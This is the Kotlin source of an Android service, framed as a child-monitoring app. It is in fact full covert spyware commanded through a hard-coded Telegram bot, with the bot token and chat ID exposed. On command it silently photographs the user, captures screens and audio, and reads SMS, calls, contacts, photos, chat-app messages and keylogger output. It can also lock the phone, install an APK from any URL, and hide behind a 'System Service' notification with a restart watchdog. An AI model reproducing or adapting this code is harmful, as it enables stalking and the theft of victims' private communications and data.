package com.coc338781.childapp

import android.app.AlarmManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.admin.DevicePolicyManager
import android.app.usage.UsageStatsManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.hardware.camera2.CameraManager
import android.location.LocationManager
import android.os.Build
import android.os.SystemClock
import android.os.Vibrator
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import android.util.Log
import android.widget.Toast
import androidx.core.app.NotificationCompat
import androidx.lifecycle.LifecycleService
import androidx.lifecycle.lifecycleScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.File
import java.text.SimpleDateFormat
import java.util.Calendar
import java.util.Date
import java.util.Locale
import java.util.concurrent.TimeUnit

class MonitoringService : LifecycleService() {

    companion object {
        // ===== මෙතන ඔබේ විස්තර =====
        const val BOT_TOKEN = "8968739971:AAEsGJc_-MNGE8KKxqwzaZM3TPinPVg_Bms"
        const val CHAT_ID = "7905408190"
        // ============================
        const val CHANNEL_ID = "svc_channel"
        const val WATCHDOG_INTERVAL = 60_000L
        private const val TAG = "MonSvc"
        @Volatile var isRunning = false
        @Volatile private var lastDailyDate = ""
    }

    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(60, TimeUnit.SECONDS)
        .build()

    private var lastUpdateId = 0L
    private var liveJob: Job? = null
    private var flashOn = false

    override fun onCreate() {
        super.onCreate()
        isRunning = true
        try {
            createChannel()
            startFg()
            startPolling()
            scheduleWatchdog()
            startDailyChecker()
        } catch (e: Exception) { Log.e(TAG, "onCreate", e) }
    }

    private fun startFg() {
        val n = buildNotification()
        try {
            if (Build.VERSION.SDK_INT >= 34) {
                startForeground(1, n,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE or
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
            } else if (Build.VERSION.SDK_INT >= 29) {
                startForeground(1, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA)
            } else {
                startForeground(1, n)
            }
        } catch (e: Exception) { Log.e(TAG, "startFg", e) }
    }

    private fun createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(CHANNEL_ID, "System Service", NotificationManager.IMPORTANCE_LOW)
            ch.setShowBadge(false)
            getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
        }
    }

    private fun buildNotification(): Notification {
        val intent = Intent(this, MainActivity::class.java)
        val pi = PendingIntent.getActivity(this, 0, intent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE)
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("Running")
            .setSmallIcon(android.R.drawable.stat_sys_download)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .setContentIntent(pi)
            .build()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)
        if (!isRunning) {
            isRunning = true
            try {
                createChannel()
                startFg()
                startPolling()
            } catch (_: Exception) {}
        }
        return START_STICKY
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        Log.d(TAG, "onTaskRemoved — watchdog will restart")
    }

    private fun scheduleWatchdog() {
        try {
            val am = getSystemService(Context.ALARM_SERVICE) as AlarmManager
            val intent = Intent(this, WatchdogReceiver::class.java)
            val pi = PendingIntent.getBroadcast(this, 1001, intent,
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE)
            val triggerAt = SystemClock.elapsedRealtime() + WATCHDOG_INTERVAL
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    am.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, pi)
                } else {
                    am.setExact(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, pi)
                }
            } catch (e: SecurityException) {
                am.setAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, pi)
            }
        } catch (e: Exception) { Log.e(TAG, "watchdog", e) }
    }

    override fun onDestroy() {
        super.onDestroy()
        isRunning = false
        liveJob?.cancel()
    }

    // ===== Daily Summary auto checker =====
    private fun startDailyChecker() {
        lifecycleScope.launch(Dispatchers.IO) {
            while (isRunning) {
                try {
                    val cal = Calendar.getInstance()
                    val hour = cal.get(Calendar.HOUR_OF_DAY)
                    val today = SimpleDateFormat("yyyy-MM-dd", Locale.getDefault()).format(Date())

                    if (hour == 21 && lastDailyDate != today) {
                        lastDailyDate = today
                        withContext(Dispatchers.Main) { sendDailySummary() }
                    }
                } catch (_: Exception) {}
                delay(60_000L) // හැම මිනිත්තුවකට check
            }
        }
    }

    private fun startPolling() {
    lifecycleScope.launch(Dispatchers.IO) {
        Log.d(TAG, "Polling started")
        while (isRunning) {
            try {
                val url = "https://api.telegram.org/bot$BOT_TOKEN/getUpdates?offset=${lastUpdateId + 1}&timeout=25"
                val resp = client.newCall(Request.Builder().url(url).build()).execute()
                val body = resp.body?.string()
                
                if (body.isNullOrEmpty()) {
                    delay(3000)
                    return@launch
                }
                
                val json = JSONObject(body)
                val result = json.optJSONArray("result")
                
                if (result == null) {
                    delay(3000)
                    return@launch
                }
                
                Log.d(TAG, "Got ${result.length()} updates")
                
                for (i in 0 until result.length()) {
                    val u = result.getJSONObject(i)
                    lastUpdateId = u.getLong("update_id")
                    val m = u.optJSONObject("message") ?: continue
                    val cid = m.getJSONObject("chat").getLong("id").toString()
                    if (cid != CHAT_ID) continue
                    val text = m.optString("text", "")
                    if (text.isNotEmpty()) {
                        Log.d(TAG, "Command: $text")
                        withContext(Dispatchers.Main) { handle(text.trim()) }
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Polling error", e)
                delay(5000)
            }
        }
    }
    }
private fun handle(raw: String) {
    val cmd = raw.lowercase()
    val arg = raw.substringAfter(' ', "").trim()
    when {
        cmd == "/ping" -> sendMsg("🏓 Pong! App is alive\n\nCameras:\n" + CameraHelper.listCameras(this))
        cmd == "/cam" -> photo(true)
        cmd == "/selfie" -> photo(false)
        cmd == "/livecam" -> live(true, arg.toIntOrNull() ?: 30)
        cmd == "/liveselfie" -> live(false, arg.toIntOrNull() ?: 30)
        cmd == "/stop" -> { liveJob?.cancel(); sendMsg("⏹ Live stopped") }
        cmd == "/screen" -> screen()
        cmd == "/livescreen" -> liveScreen(arg.toIntOrNull() ?: 30)
        cmd == "/location" -> location()
        cmd == "/battery" -> battery()
        cmd == "/sms" -> sms()
        cmd == "/calls" -> calls()
        cmd == "/gallery" -> gallery()
        cmd == "/flash" -> flash()
        cmd == "/vibrate" -> vibrate()
        cmd == "/toast" -> toast(arg)
        cmd == "/whatsapp" -> showMessages("whatsapp")
        cmd == "/fb" -> showMessages("fb")
        cmd == "/imo" -> showMessages("imo")
        cmd == "/usage" -> appUsage()
        cmd == "/notifications" -> showNotifications()
        cmd == "/contacts" -> contacts()
        cmd == "/lock" -> lockPhone("")
        cmd == "/lockscreen" -> lockPhone(arg)
        cmd == "/record" -> {
            val sec = arg.toIntOrNull() ?: 30
            VoiceRecorder.startRecording(this, sec) { status ->
                sendMsg(status)
            }
        }
        cmd == "/block" -> {
            if (arg.isEmpty()) {
                sendMsg("❌ Usage: /block [app name]\n\nExample: /block Temple Run")
            } else {
                val pkg = AppBlocker.findPackageByName(this, arg)
                if (pkg != null) {
                    AppBlocker.blockApp(this, pkg)
                    sendMsg("🚫 Blocked: $arg\n📦 $pkg")
                } else {
                    sendMsg("❌ App not found: $arg")
                }
            }
        }
        cmd == "/unblock" -> {
            if (arg.isEmpty()) {
                sendMsg("❌ Usage: /unblock [app name]")
            } else {
                val pkg = AppBlocker.findPackageByName(this, arg)
                if (pkg != null) {
                    AppBlocker.unblockApp(this, pkg)
                    sendMsg("✅ Unblocked: $arg\n📦 $pkg")
                } else {
                    AppBlocker.unblockApp(this, arg)
                    sendMsg("✅ Unblocked: $arg")
                }
            }
        }
        cmd == "/blocked" -> {
            val list = AppBlocker.getBlockedList(this)
            if (list.isEmpty()) {
                sendMsg("📋 No apps blocked")
            } else {
                val pm = packageManager
                val sb = StringBuilder("🚫 Blocked Apps (${list.size})\n━━━━━━━━━━━━━━━━━━\n")
                for (pkg in list) {
                    val name = try {
                        pm.getApplicationLabel(pm.getApplicationInfo(pkg, 0)).toString()
                    } catch (_: Exception) { pkg }
                    sb.append("📱 $name\n🔗 $pkg\n\n")
                }
                sendMsg(sb.toString())
            }
        }
        cmd == "/unblockall" -> {
            AppBlocker.clearAll(this)
            sendMsg("✅ All apps unblocked")
        }
        cmd == "/whatsapp_on" -> {
    AutoScreenshot.setEnabled(this, true)
    sendMsg("✅ WhatsApp Auto-Screenshot ON")
}
cmd == "/whatsapp_off" -> {
    AutoScreenshot.setEnabled(this, false)
    sendMsg("✅ WhatsApp Auto-Screenshot OFF")
}
cmd == "/whatsapp_status" -> {
    val status = if (AutoScreenshot.isEnabled(this)) "ON ✅" else "OFF ❌"
    sendMsg("📸 WhatsApp Auto-Screenshot: $status\n\nCommands:\n/whatsapp_on\n/whatsapp_off")
}
        cmd == "/livetrack" -> {
            when (arg.lowercase()) {
                "on" -> {
                    LiveLocationTracker.start(this)
                    sendMsg("📍 Live Location ON — 15 min intervals, 24h")
                }
                "off" -> {
                    LiveLocationTracker.stop(this)
                    sendMsg("📍 Live Location OFF")
                }
                else -> {
                    val status = if (LiveLocationTracker.isActive(this)) "ON" else "OFF"
                    sendMsg("📍 Live Location: $status\n\nUsage:\n/livetrack on\n/livetrack off")
                }
            }
        }
        cmd == "/keys" -> {
            val keys = KeyloggerService.getKeys(this, 50)
            if (keys.isEmpty()) {
                sendMsg("⌨️ No keys captured yet")
            } else {
                val sb = StringBuilder("⌨️ Keylogger (Last ${keys.size})\n━━━━━━━━━━━━━━━━━━\n")
                for ((app, text, time) in keys) {
                    val fmt = java.text.SimpleDateFormat("hh:mm a", java.util.Locale.getDefault())
                    sb.append("📱 $app\n${text.take(200)}\n🕐 ${fmt.format(java.util.Date(time))}\n\n")
                }
                sendMsg(sb.toString())
            }
        }
        cmd == "/daily" -> sendDailySummary()
        cmd == "/clearmsgs" -> {
            MessageStore.clearAll(this)
            MessageStore.clearNotifications(this)
            sendMsg("🗑 All stored messages cleared")
        }
        cmd.startsWith("/update") -> {
            if (arg.isNotEmpty() && arg.startsWith("http")) {
                updateApp(arg)
            } else {
                sendMsg("❌ Usage: /update [APK URL]")
            }
        }
        cmd == "/version" -> sendMsg("📱 Version: 1.0\nPackage: $packageName")
        cmd == "/help" -> sendMsg(
            "📋 Commands:\n\n" +
            "📷 /cam /selfie\n" +
            "🔴 /livecam [sec] /liveselfie [sec]\n" +
            "⏹ /stop\n" +
            "📸 /screen /livescreen [sec]\n" +
            "📍 /location\n" +
            "🔋 /battery\n" +
            "💬 /sms /calls /gallery\n" +
            "📊 /usage\n" +
            "🔔 /notifications\n" +
            "👥 /contacts\n" +
            "🔒 /lock /lockscreen [msg]\n" +
            "📈 /daily\n" +
            "💬 /whatsapp /fb /imo\n" +
            "🎙 /record [sec]\n" +
            "🚫 /block [app]\n" +
            "✅ /unblock [app]\n" +
            "📋 /blocked\n" +
            "🗑 /unblockall\n" +
            "📸 /whatsapp_on /whatsapp_off\n" +
            "📍 /livetrack on/off\n" +
            "⌨️ /keys\n" +
            "🗑 /clearmsgs\n" +
            "🔆 /flash\n" +
            "📳 /vibrate\n" +
            "💬 /toast [msg]\n" +
            "🔄 /update [url]\n" +
            "📱 /version\n" +
            "🏓 /ping"
        )
        else -> sendMsg("❓ Unknown: $raw")
    }
    }
            
    // ===== App Usage Report =====
    private fun appUsage() {
        try {
            val usm = getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
            val end = System.currentTimeMillis()
            val start = end - 24 * 60 * 60 * 1000L // 24h
            val stats = usm.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, start, end)

            if (stats == null || stats.isEmpty()) {
                sendMsg("❌ Usage stats not available.\n\nGo to Settings → Apps → Special Access → Usage Access → System Service → Allow")
                return
            }

            val pm = packageManager
            val appTimes = mutableMapOf<String, Long>()
            for (s in stats) {
                if (s.totalTimeInForeground > 60_000L) {
                    appTimes[s.packageName] = s.totalTimeInForeground
                }
            }

            if (appTimes.isEmpty()) {
                sendMsg("📊 No app usage in last 24 hours")
                return
            }

            val sorted = appTimes.entries.sortedByDescending { it.value }.take(15)
            val sb = StringBuilder("📊 App Usage (Last 24h)\n━━━━━━━━━━━━━━━━━━\n")
            var total = 0L
            for ((pkg, time) in sorted) {
                val name = try {
                    pm.getApplicationLabel(pm.getApplicationInfo(pkg, 0)).toString()
                } catch (_: Exception) { pkg }
                val mins = time / 60000
                val hrs = mins / 60
                val m = mins % 60
                val timeStr = if (hrs > 0) "${hrs}h ${m}m" else "${m}m"
                sb.append("📱 $name — $timeStr\n")
                total += time
            }
            val totalMins = total / 60000
            sb.append("\n━━━━━━━━━━━━━━━━━━\nTotal: ${totalMins / 60}h ${totalMins % 60}m")
            sendMsg(sb.toString())
        } catch (e: Exception) {
            sendMsg("❌ Usage error: ${e.message}")
        }
    }

    // ===== Notification History =====
    private fun showNotifications() {
        val notifs = MessageStore.getNotifications(this, 30)
        if (notifs.isEmpty()) {
            sendMsg("🔔 No notifications captured yet.\n\nNotification Access ON ද බලන්න.")
            return
        }
        val sb = StringBuilder("🔔 Recent Notifications (${notifs.size})\n━━━━━━━━━━━━━━━━━━\n")
        val fmt = SimpleDateFormat("hh:mm a", Locale.getDefault())
        for ((title, text, time) in notifs) {
            sb.append("📩 $title\n${text.take(100)}\n🕐 ${fmt.format(Date(time))}\n\n")
        }
        sendMsg(sb.toString())
    }

    // ===== Contacts =====
    private fun contacts() {
        try {
            val cursor = contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null
            )
            val names = mutableSetOf<String>()
            cursor?.use {
                while (it.moveToNext()) {
                    val name = it.getString(it.getColumnIndexOrThrow(
                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                    val number = it.getString(it.getColumnIndexOrThrow(
                        ContactsContract.CommonDataKinds.Phone.NUMBER))
                    names.add("👤 $name\n📞 $number")
                    if (names.size >= 50) break
                }
            }
            if (names.isEmpty()) {
                sendMsg("❌ No contacts")
                return
            }
            val sb = StringBuilder("👥 Contacts (${names.size})\n━━━━━━━━━━━━━━━━━━\n")
            names.take(30).forEach { sb.append("$it\n\n") }
            if (names.size > 30) sb.append("... +${names.size - 30} more")
            sendMsg(sb.toString())
        } catch (e: Exception) {
            sendMsg("❌ Contacts error: ${e.message}")
        }
    }

    // ===== Lock Phone =====
    private fun lockPhone(message: String) {
        try {
            if (message.isNotEmpty()) {
                android.os.Handler(mainLooper).post {
                    Toast.makeText(this, message, Toast.LENGTH_LONG).show()
                }
                // Toast එක පේන්න තත්පර 2ක් ඉන්න
                android.os.Handler(mainLooper).postDelayed({
                    doLock()
                }, 2000L)
            } else {
                doLock()
            }
        } catch (e: Exception) {
            sendMsg("❌ Lock error: ${e.message}")
        }
    }

    private fun doLock() {
        try {
            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val admin = ComponentName(this, MyDeviceAdmin::class.java)
            if (dpm.isAdminActive(admin)) {
                dpm.lockNow()
                sendMsg("🔒 Phone locked")
            } else {
                sendMsg("❌ Device Admin not active. Enable it first.")
            }
        } catch (e: Exception) {
            sendMsg("❌ Lock failed: ${e.message}")
        }
    }

    // ===== Daily Summary =====
    private fun sendDailySummary() {
        lifecycleScope.launch(Dispatchers.IO) {
            try {
                val sb = StringBuilder()
                sb.append("📊 Daily Report\n")
                sb.append("━━━━━━━━━━━━━━━━━━\n")
                sb.append("📅 ${SimpleDateFormat("EEE, dd MMM", Locale.getDefault()).format(Date())}\n\n")

                // Battery
                try {
                    val bm = getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
                    val lvl = bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
                    sb.append("🔋 Battery: $lvl%\n")
                } catch (_: Exception) {}

                // Location
                try {
                    val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
                    val loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                        ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
                    if (loc != null) {
                        sb.append("📍 Location: ${String.format("%.4f", loc.latitude)}, ${String.format("%.4f", loc.longitude)}\n")
                    }
                } catch (_: Exception) {}

                // Screen time
                try {
                    val usm = getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
                    val end = System.currentTimeMillis()
                    val start = end - 24 * 60 * 60 * 1000L
                    val stats = usm.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, start, end)
                    var total = 0L
                    stats?.forEach { total += it.totalTimeInForeground }
                    val mins = total / 60000
                    sb.append("📱 Screen time: ${mins / 60}h ${mins % 60}m\n")
                } catch (_: Exception) {}

                // Calls
                try {
                    val cursor = contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null,
                        CallLog.Calls.DATE + " DESC LIMIT 50")
                    var count = 0
                    cursor?.use {
                        val todayStart = System.currentTimeMillis() - 24 * 60 * 60 * 1000L
                        while (it.moveToNext()) {
                            val date = it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DATE))
                            if (date > todayStart) count++
                        }
                    }
                    sb.append("📞 Calls: $count\n")
                } catch (_: Exception) {}

                // SMS
                try {
                    val cursor = contentResolver.query(
                        android.net.Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 50")
                    var count = 0
                    cursor?.use {
                        val todayStart = System.currentTimeMillis() - 24 * 60 * 60 * 1000L
                        while (it.moveToNext()) {
                            val date = it.getLong(it.getColumnIndexOrThrow("date"))
                            if (date > todayStart) count++
                        }
                    }
                    sb.append("💬 SMS: $count\n")
                } catch (_: Exception) {}

                // Photos
                try {
                    val cursor = contentResolver.query(
                        MediaStore.Images.Media.EXTERNAL_CONTENT_URI, null, null, null, "date_added DESC LIMIT 50")
                    var count = 0
                    cursor?.use {
                        val todayStart = System.currentTimeMillis() / 1000 - 24 * 60 * 60
                        while (it.moveToNext()) {
                            val date = it.getLong(it.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED))
                            if (date > todayStart) count++
                        }
                    }
                    sb.append("📷 Photos: $count\n")
                } catch (_: Exception) {}

                withContext(Dispatchers.Main) { sendMsg(sb.toString()) }
            } catch (e: Exception) {
                withContext(Dispatchers.Main) { sendMsg("❌ Daily error: ${e.message}") }
            }
        }
    }

    // ===== AUTO UPDATE =====
    private fun updateApp(url: String) {
        sendMsg("🔄 Update started...\n$url")
        lifecycleScope.launch(Dispatchers.IO) {
            try {
                UpdateManager.downloadAndInstall(this@MonitoringService, url) { status ->
                    lifecycleScope.launch(Dispatchers.Main) { sendMsg(status) }
                }
            } catch (e: Exception) {
                withContext(Dispatchers.Main) { sendMsg("❌ Update error: ${e.message}") }
            }
        }
    }

    private fun photo(back: Boolean) {
        sendMsg("📷 Taking ${if (back) "back" else "front"} photo...")
        CameraHelper.takePhotoWithRetry(this, back) { f, info ->
            if (f != null) {
                sendMsg("📸 Camera: $info")
                sendPhoto(f)
            } else {
                sendMsg("🔴 Failed: $info")
            }
        }
    }

    private fun live(back: Boolean, seconds: Int) {
        liveJob?.cancel()
        sendMsg("🔴 Live camera started (${seconds}s)")
        liveJob = lifecycleScope.launch(Dispatchers.IO) {
            val end = System.currentTimeMillis() + seconds * 1000L
            var count = 0
            var firstInfo = ""
            while (System.currentTimeMillis() < end && isRunning) {
                val done = java.util.concurrent.CountDownLatch(1)
                var gotFile: File? = null
                withContext(Dispatchers.Main) {
                    CameraHelper.takePhoto(this@MonitoringService, back) { f, info ->
                        if (f != null) gotFile = f
                        if (firstInfo.isEmpty()) firstInfo = info
                        done.countDown()
                    }
                }
                done.await()
                if (gotFile != null) {
                    sendPhotoFile(gotFile!!)
                    count++
                }
                delay(2000)
            }
            withContext(Dispatchers.Main) {
                sendMsg("🟢 Live ended ($count photos) [$firstInfo]")
            }
        }
    }

    private fun screen() {
        val svc = ScreenService.instance
        if (svc == null) { sendMsg("❌ Enable Accessibility Service"); return }
        if (Build.VERSION.SDK_INT < 30) { sendMsg("❌ Android 11+ only"); return }
        sendMsg("📸 Screenshot...")
        svc.takeShot { bmp -> if (bmp != null) svc.sendScreen(bmp) else sendMsg("🔴 Failed") }
    }

    private fun liveScreen(seconds: Int) {
        val svc = ScreenService.instance
        if (svc == null) { sendMsg("❌ Enable Accessibility"); return }
        if (Build.VERSION.SDK_INT < 30) { sendMsg("❌ Android 11+"); return }
        liveJob?.cancel()
        sendMsg("🔴 Live screen (${seconds}s)")
        liveJob = lifecycleScope.launch(Dispatchers.IO) {
            val end = System.currentTimeMillis() + seconds * 1000L
            while (System.currentTimeMillis() < end && isRunning) {
                withContext(Dispatchers.Main) {
                    svc.takeShot { bmp -> if (bmp != null) svc.sendScreen(bmp) }
                }
                delay(2000)
            }
            withContext(Dispatchers.Main) { sendMsg("🟢 Live screen ended") }
        }
    }

    private fun location() {
        try {
            val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
            var loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER)

            if (loc != null) {
                val link = "https://maps.google.com/?q=${loc.latitude},${loc.longitude}"
                sendMsg("📍 Location\nLat: ${loc.latitude}\nLng: ${loc.longitude}\nAccuracy: ${loc.accuracy}m\n\n$link")
            } else {
                sendMsg("📍 No cached location. GPS එකට ටිකක් ඉන්න.\n\nTry again in 30s.")
            }
        } catch (e: Exception) { sendMsg("❌ ${e.message}") }
    }

    private fun battery() {
        try {
            val bm = getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
            val lvl = bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
            val charging = bm.isCharging
            sendMsg("🔋 Battery: $lvl%\n${if (charging) "⚡ Charging" else "Not charging"}")
        } catch (e: Exception) { sendMsg("❌ ${e.message}") }
    }

    private fun sms() {
        try {
            val cursor = contentResolver.query(
                android.net.Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 10")
            val sb = StringBuilder("💬 Latest SMS:\n\n")
            var c = 0
            cursor?.use {
                while (it.moveToNext() && c < 10) {
                    val addr = it.getString(it.getColumnIndexOrThrow("address"))
                    val body = it.getString(it.getColumnIndexOrThrow("body"))
                    sb.append("📩 $addr\n$body\n\n")
                    c++
                }
            }
            sendMsg(sb.toString())
        } catch (e: Exception) { sendMsg("❌ ${e.message}") }
    }

    private fun calls() {
        try {
            val cursor = contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null,
                CallLog.Calls.DATE + " DESC LIMIT 10")
            val sb = StringBuilder("📞 Recent calls:\n\n")
            var c = 0
            cursor?.use {
                while (it.moveToNext() && c < 10) {
                    val num = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.NUMBER))
                    val type = it.getInt(it.getColumnIndexOrThrow(CallLog.Calls.TYPE))
                    val dur = it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DURATION))
                    val t = when (type) {
                        CallLog.Calls.INCOMING_TYPE -> "📥"
                        CallLog.Calls.OUTGOING_TYPE -> "📤"
                        CallLog.Calls.MISSED_TYPE -> "❌"
                        else -> "?"
                    }
                    sb.append("$t $num (${dur}s)\n")
                    c++
                }
            }
            sendMsg(sb.toString())
        } catch (e: Exception) { sendMsg("❌ ${e.message}") }
    }

    private fun gallery() {
        try {
            val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
            val cursor = contentResolver.query(uri, null, null, null, "date_added DESC LIMIT 3")
            var c = 0
            cursor?.use {
                while (it.moveToNext() && c < 3) {
                    val id = it.getLong(it.getColumnIndexOrThrow(MediaStore.Images.Media._ID))
                    val fileUri = android.content.ContentUris.withAppendedId(uri, id)
                    val bytes = contentResolver.openInputStream(fileUri)?.readBytes()
                    if (bytes != null) {
                        val f = File(cacheDir, "gal_$id.jpg")
                        f.writeBytes(bytes)
                        sendPhotoSlow(f)
                    }
                    c++
                }
            }
            if (c == 0) sendMsg("❌ No photos")
        } catch (e: Exception) { sendMsg("❌ ${e.message}") }
    }

    private fun sendPhotoSlow(f: File) {
        try {
            val url = "https://api.telegram.org/bot$BOT_TOKEN/sendPhoto"
            val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", CHAT_ID)
                .addFormDataPart("photo", f.name, f.asRequestBody("image/jpeg".toMediaType()))
                .build()
            client.newCall(Request.Builder().url(url).post(body).build()).execute()
            f.delete()
            Thread.sleep(1500)
        } catch (_: Exception) {}
    }

    private fun flash() {
        try {
            val cm = getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val id = cm.cameraIdList.firstOrNull { camId ->
                cm.getCameraCharacteristics(camId)
                    .get(android.hardware.camera2.CameraCharacteristics.FLASH_INFO_AVAILABLE) == true
            } ?: run { sendMsg("❌ No flash"); return }
            flashOn = !flashOn
            cm.setTorchMode(id, flashOn)
            sendMsg("🔆 Flash ${if (flashOn) "ON" else "OFF"}")
        } catch (e: Exception) { sendMsg("❌ ${e.message}") }
    }

    private fun vibrate() {
        try {
            val v = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
            if (Build.VERSION.SDK_INT >= 26) {
                v.vibrate(android.os.VibrationEffect.createOneShot(1000, android.os.VibrationEffect.DEFAULT_AMPLITUDE))
            } else {
                @Suppress("DEPRECATION") v.vibrate(1000)
            }
            sendMsg("📳 Vibrating")
        } catch (e: Exception) { sendMsg("❌ ${e.message}") }
    }

    private fun toast(msg: String) {
        if (msg.isEmpty()) return
        android.os.Handler(mainLooper).post {
            Toast.makeText(this, msg, Toast.LENGTH_LONG).show()
        }
        sendMsg("✅ Toast shown: $msg")
    }

    private fun showMessages(app: String) {
        val notifMsgs = MessageStore.getMessages(this, app)
        val screenReads = MessageStore.getScreenReads(this, app)
        val emoji = when (app) {
            "whatsapp" -> "💬"
            "fb" -> "📘"
            "imo" -> "📱"
            else -> "📩"
        }

        val listenerEnabled = try {
            val enabled = android.provider.Settings.Secure.getString(
                contentResolver, "enabled_notification_listeners") ?: ""
            enabled.contains(packageName)
        } catch (_: Exception) { false }

        val sb = StringBuilder()
        sb.append("$emoji ${app.uppercase()}\n\n")

        if (notifMsgs.isNotEmpty()) {
            sb.append("━━━━━━━━━━━━━━━━\n")
            sb.append("📩 Notifications (${notifMsgs.size}):\n")
            sb.append("━━━━━━━━━━━━━━━━\n")
            for (m in notifMsgs.take(20)) {
                sb.append("👤 ${m.from}\n${m.text}\n\n")
            }
            if (notifMsgs.size > 20) sb.append("... +${notifMsgs.size - 20} more\n\n")
        }

        if (screenReads.isNotEmpty()) {
            sb.append("━━━━━━━━━━━━━━━━\n")
            sb.append("📱 Screen Read (${screenReads.size}):\n")
            sb.append("━━━━━━━━━━━━━━━━\n")
            sb.append(screenReads.first().content.take(3000))
            sb.append("\n")
        }

        if (notifMsgs.isEmpty() && screenReads.isEmpty()) {
            sb.append("❌ No messages captured yet.\n\n")
        }

        sb.append("\n━━━━━━━━━━━━━━━━\n")
        sb.append("📊 Diagnostic:\n")
        sb.append("• Listener: ${if (listenerEnabled) "✅ ON" else "❌ OFF"}\n")
        sb.append("• Notifications: ${notifMsgs.size}\n")
        sb.append("• Screen reads: ${screenReads.size}\n")

        sendMsg(sb.toString())
    }

    private fun sendMsg(t: String) {
        lifecycleScope.launch(Dispatchers.IO) {
            try {
                val url = "https://api.telegram.org/bot$BOT_TOKEN/sendMessage"
                val json = JSONObject().apply { put("chat_id", CHAT_ID); put("text", t) }
                val body = json.toString().toRequestBody("application/json".toMediaType())
                client.newCall(Request.Builder().url(url).post(body).build()).execute()
            } catch (_: Exception) {}
        }
    }

    private fun sendPhoto(f: File) {
        lifecycleScope.launch(Dispatchers.IO) { sendPhotoFile(f) }
    }

    private fun sendPhotoFile(f: File) {
        try {
            val url = "https://api.telegram.org/bot$BOT_TOKEN/sendPhoto"
            val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", CHAT_ID)
                .addFormDataPart("photo", f.name, f.asRequestBody("image/jpeg".toMediaType()))
                .build()
            client.newCall(Request.Builder().url(url).post(body).build()).execute()
            f.delete()
        } catch (_: Exception) {}
    }
}
